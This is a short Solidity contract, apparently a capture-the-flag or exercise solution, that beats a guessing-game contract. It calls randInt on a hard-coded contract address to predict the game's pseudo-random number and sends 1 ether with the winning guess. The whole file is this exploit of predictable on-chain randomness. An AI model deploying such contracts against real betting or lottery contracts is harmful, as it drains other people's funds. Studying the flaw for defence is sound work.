pragma solidity 0.7.0;

import "./ExampleQuizExploit.sol";

contract iflpAttacker {
    
    function attack(ExampleQuizExploit instance) public payable {
        require(msg.value == 1 ether);
        instance.guess{value: 1 ether}(Lollercoaster(0x25Be61724B64117DC9aC9DDd2A06B7DEc052D5cb).randInt(1000000));        
    }

    receive() external payable { }

}